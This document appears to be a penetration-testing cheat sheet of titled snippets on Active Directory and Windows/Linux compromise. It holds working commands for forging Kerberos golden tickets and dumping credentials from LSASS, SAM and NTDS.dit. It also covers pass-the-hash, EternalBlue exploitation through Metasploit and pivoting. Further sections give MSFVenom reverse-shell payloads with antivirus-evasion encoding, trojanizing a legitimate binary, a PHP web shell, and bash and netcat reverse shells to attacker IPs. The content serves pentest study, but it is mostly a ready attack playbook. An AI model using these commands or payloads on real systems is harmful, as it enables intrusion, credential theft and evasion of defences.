mimikatz # kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<server> /service:<service> /rc4:<NTLM-hash> /ptt

docs.title: Golden Ticket Attacks
docs.text:
Golden Tickets are created by forging a TGT using the NTLM hash of the krbtgt account, granting full domain control.

Dump krbtgt hash:

mimikatz # lsadump::lsa /patch

Forge and inject a Golden Ticket:

mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<NTLM-hash> /ptt

docs.title: Overpass-the-Hash (Pass-the-Key)
docs.text:
An attacker can use an NTLM hash to obtain a Kerberos TGT instead of an NTLM authentication.

mimikatz # sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe

docs.title: Tools for Kerberos Attacks
docs.text:
• Impacket: Used for AS-REP roasting, Kerberoasting, and ticket extraction.
  • Mimikatz: Extracts and manipulates Kerberos tickets.
  • Rubeus: Advanced Kerberos tool for ticket manipulation.

docs.title: Resources
docs.text:
• Mimikatz
  • Impacket - secretsdump.py
  • Windows Sysinternals - ProcDump

Tip

If LSASS is protected (PPL enabled), try dumping from an offline copy: shadow copy → copy NTDS.dit + SYSTEM hive → impacket-secretsdump locally. No process injection required.

Watch out

LSASS dump via Task Manager, procdump, or comsvcs.dll is heavily signatured by EDR. On hardened targets, try nanodump or pypykatz against an offline SAM/SYSTEM copy. Always check for EDR before touching LSASS.

docs.title: Extracting Credentials from LSASS
docs.text: LSASS (Local Security Authority Subsystem Service) stores NTLM hashes and Kerberos tickets, making it a primary target for credential dumping.

docs.title: Using Mimikatz
docs.text:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

The output will display cached credentials, including NTLM hashes and plaintext passwords, if available.

docs.title: Dumping LSASS Process with Task Manager
docs.text:
1. Open Task Manager (taskmgr.exe).

  2. Locate the lsass.exe process.

  3. Right-click > Create Dump File.

  4. Transfer the .dmp file to an attacker machine and analyze with:

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

docs.title: Dumping LSASS Using Procdump
docs.text:
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

docs.title: Extracting Password Hashes from the SAM Database
docs.text: SAM stores local account password hashes.

docs.title: Using Mimikatz
docs.text:
mimikatz # token::elevate
mimikatz # lsadump::sam

docs.title: Using RegSave
docs.text:
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

Extract hashes using Impacket:

secretsdump.py -sam sam.save -system system.save LOCAL

docs.title: Extracting NTDS.dit for Domain Credentials
docs.text: NTDS.dit stores Active Directory credentials.

docs.title: Using vssadmin (Shadow Copy)
docs.text:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
reg save HKLM\SYSTEM C:\system.save

Dump hashes:

impacket-secretsdump -ntds ntds.dit -system system.save LOCAL

docs.title: Dumping Cached Credentials
docs.text: Cached credentials allow offline authentication.

docs.title: Using Mimikatz
docs.text:
mimikatz # sekurlsa::credman
mimikatz # sekurlsa::cache

docs.title: Using Windows API
docs.text: rundll32.exe keymgr.dll,KRShowKeyMgr

docs.title: Pass-the-Hash (PTH) Attacks
docs.text: Using obtained NTLM hashes for authentication.

docs.title: SMB
docs.text: crackmapexec smb <target-ip> -u Administrator -H <NTLM-hash>

docs.title: WinRM
docs.text: evil-winrm -i <target-ip> -u Administrator -H <NTLM-hash>

docs.title: PsExec
docs.text: impacket-psexec administrator@<target-ip> -hashes :<NTLM-hash>

docs.title: Starting Metasploit
docs.text:
When to use Metasploit

Use Metasploit when: the exploit module exists and matches the exact version, you need a stable meterpreter session for post-exploitation, or you need built-in pivoting/routing. Go manual when: OSCP rules apply, AV detects the payload, or you need a one-shot exploit with no handler overhead.

Watch out

Meterpreter is heavily signatured. On hardened targets, use shell stage instead, or generate a custom payload with MSFVenom and a custom encoder. Always check AV status before dropping a payload.

msfconsole

Update Metasploit modules:

msfupdate

docs.title: Searching for Exploits
docs.text:
Find exploits related to a specific service:

search name:<service>

Example:

search smb

Filter results by type:

search type:exploit platform:windows

docs.title: Using an Exploit
docs.text:
Once an exploit is found, load it:

use exploit/windows/smb/ms17_010_eternalblue

View required options:

show options

Set the target IP:

set RHOSTS <target-ip>

Set the payload:

set payload windows/meterpreter/reverse_tcp

Start the exploit:

exploit

docs.title: Handling Sessions
docs.text:
List active sessions:

sessions -l

Interact with a session:

sessions -i <session-id>

Background a session:

Ctrl+Z

docs.title: Meterpreter Commands
docs.text:
Once inside a Meterpreter session, use:

sysinfo
getuid
hashdump
shell

Spawn an interactive shell:

execute -f cmd.exe -i -t

docs.title: Privilege Escalation
docs.text:
Check system privileges:

getprivs

Attempt escalation:

run post/windows/escalate/getsystem

docs.title: Pivoting with Metasploit
docs.text:
Use a session to pivot into the internal network:

use auxiliary/server/socks4a
set SRVPORT 1080
exploit

Modify proxychains configuration:

nano /etc/proxychains.conf

Add:

socks4 127.0.0.1 1080

Run scans through the pivot:

proxychains nmap -sT -Pn <internal-ip>

docs.title: Automating Attacks with Resource Scripts
docs.text:
Create a script:

echo "use exploit/windows/smb/ms17_010_eternalblue" > exploit.rc
echo "set RHOSTS <target-ip>" >> exploit.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> exploit.rc
echo "exploit" >> exploit.rc

Run the script:

msfconsole -r exploit.rc

docs.title: MSFVenom
docs.text:
Tip

For Windows targets with AV, use a staged payload (windows/x64/meterpreter/reverse_tcp) over stageless (windows/x64/meterpreter_reverse_tcp) — staged payloads are smaller and easier to obfuscate. Pair with shikata_ga_nai encoder or custom XOR.

Watch out

MSFVenom output format matters: -f exe for Windows, -f elf for Linux, -f raw for shellcode injection. Wrong format = silent failure when executed.

docs.title: Checking Available Payloads
docs.text:
List all available payloads:

msfvenom --list payloads

Find a specific payload:

msfvenom --list payloads | grep windows

docs.title: Generating Payloads
docs.text: MSFVenom can generate payloads in various formats to exploit different operating systems.

docs.title: Linux Reverse Shell (ELF)
docs.text: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f elf > shell.elf

docs.title: Windows Reverse Shell (EXE)
docs.text: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell.exe

docs.title: PHP Reverse Shell
docs.text:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php

Inject the payload into a web page:

<?php system($_GET['cmd']); ?>

docs.title: Python Reverse Shell
docs.text:
msfvenom -p python/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw > shell.py

Run the payload:

python shell.py

docs.title: Windows Shellcode for Injection
docs.text: msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f c

docs.title: Bash Reverse Shell
docs.text: msfvenom -p cmd/unix/reverse_bash LHOST=<attacker-ip> LPORT=<port> -f raw

docs.title: Encoding Payloads to Evade Detection
docs.text:
To avoid detection by antivirus (AV) solutions, encode the payload:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 5 > encoded_shell.exe

Check available encoders:

msfvenom --list encoders

docs.title: Injecting Payloads into Legitimate Binaries
docs.text: msfvenom -p windows/meterpreter/reverse_tcp -x notepad.exe -k -f exe -o infected.exe

docs.title: Delivering the Payload
docs.text:
Once generated, transfer the payload using:

python3 -m http.server 80

On the target:

wget http://<attacker-ip>/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf
./shell.elf

docs.title: Setting Up a Metasploit Listener
docs.text:
Start a Metasploit handler:

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT <port>
exploit

docs.title: Bind vs. Reverse Shell Decision Table
docs.text:
Situation Use Firewall blocks inbound to target Reverse shell Firewall blocks outbound from target Bind shell Need interactive shell upgrade python3 -c 'import pty; pty.spawn("/bin/bash")' then stty raw -echo; fg Target is Windows, no AV PowerShell reverse shell Target is Windows, AV active MSFVenom staged shellcode or manual C#

Tip

After catching a reverse shell, immediately upgrade it: python3 -c 'import pty; pty.spawn("/bin/bash")', then background with Ctrl+Z, run stty raw -echo; fg, then export TERM=xterm. Skipping this makes tab completion and Ctrl+C unusable.

Watch out

Netcat on BSD (macOS) doesn't support -e. Use ncat from nmap or mkfifo instead: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> >/tmp/f.

docs.title: Checking for Network Restrictions
docs.text:
Before choosing a shell type, check if outbound connections are allowed:

nc -zv $IP 4444

If the connection is successful, a reverse shell is possible.

docs.title: Setting Up a Netcat Listener
docs.text:
Before executing a reverse shell, start a listener on the attacker's machine:

nc -lvnp <port>

docs.title: Bash
docs.text:
Start Here: https://www.revshells.com/

Note: If you're unable to trigger a shell using the above URL, try the following: 

bash -c 'bash -i >& /dev/tcp/10.10.14.10/9005 0>&1'

docs.title: NC shell:
docs.text:
msfvenom -p windows/shell_reverse_tcp  LHOST=192.168.45.198 LPORT=4444 -f exe > winshell.exe

Other MSFvenom payloads: https://github.com/frizb/MSF-Venom-Cheatsheet

docs.title: Meterpreter shell:
docs.text:
setg lhost 192.168.45.196
setg lport 443
search windows/meterpreter/reverse_tcp
